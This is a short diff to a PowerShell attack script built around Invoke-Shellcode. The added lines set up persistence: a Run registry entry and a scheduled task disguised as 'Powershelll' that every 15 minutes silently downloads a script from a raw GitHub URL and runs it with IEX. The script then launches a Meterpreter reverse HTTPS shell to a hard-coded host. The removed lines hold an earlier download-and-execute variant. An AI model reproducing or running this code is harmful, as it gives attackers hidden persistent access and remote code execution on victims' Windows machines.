@@ -612,6 +612,6 @@ function Invoke-Shellcode
         }
     }   
 }
-REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Powershelll" /t REG_SZ /F /D "schtasks /CREATE /TN Powershelll /SC MINUTE /MO 15 /F /TR "
-schtasks /CREATE /TN "Powershelll" /SC MINUTE /MO 15 /F /TR "cmd /c powershell.exe -windowstyle hidden -command powershell.exe -windowstyle hidden -command ([XML](new-object system.net.webclient).DownloadString('http://beta.json-generator.com/api/json/get/E1rVJX7yG?format=xml')).response.items.item.command"
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Powershelll" /t REG_SZ /F /D "schtasks /CREATE /TN Powershelll /SC MINUTE /MO 15 /F /TR ""cmd /c powershell.exe -windowstyle hidden -command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/iamjharish/ps/master/psh.ps1')"""
+schtasks /CREATE /TN "Powershelll" /SC MINUTE /MO 15 /F /TR "cmd /c powershell.exe -windowstyle hidden -command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/iamjharish/ps/master/psh.ps1')"
 Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.0.110 -Lport 443 -Force
